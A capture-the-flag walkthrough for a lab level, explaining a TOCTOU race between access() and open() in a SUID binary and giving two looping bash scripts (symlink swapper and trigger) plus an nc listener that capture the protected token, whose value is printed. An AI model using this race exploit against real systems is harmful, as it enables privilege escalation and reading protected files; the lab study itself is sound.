## Step 1

Logged in as `level10`. The home directory contains:


```
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```
- level10 is a SUID binary owned by flag10
```
./level10 token localhost
You don't have access to token

```
strings level10 reveals usage of:

access(): checks permissions

open(): reads the file

socket, connect, write: sends file over TCP to host:6969

This sequence introduces a classic TOCTOU race condition, where access is verified before opening the file.
## step 2

We exploit the race between access() and open() using two scripts:

linker.sh – Race Controller

Create Dummy File for Access Check
```
echo "ho" > /tmp/ooo
```

```
#!/bin/bash
while true; do

  ln -fs /tmp/ooo /tmp/link

  ln -fs /home/user/level10/token /tmp/link
done
```
spamer.sh – Binary Trigger
```
#!/bin/bash
while true ; do
  /home/user/level10/level10 /tmp/link 127.0.0.1
done
```
In a third terminal, run a listener:
```
nc -lk 6969

```
```
You should see the flag appear after some attempts:
.*( )*.
ho
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
ho
.*( )*.

```
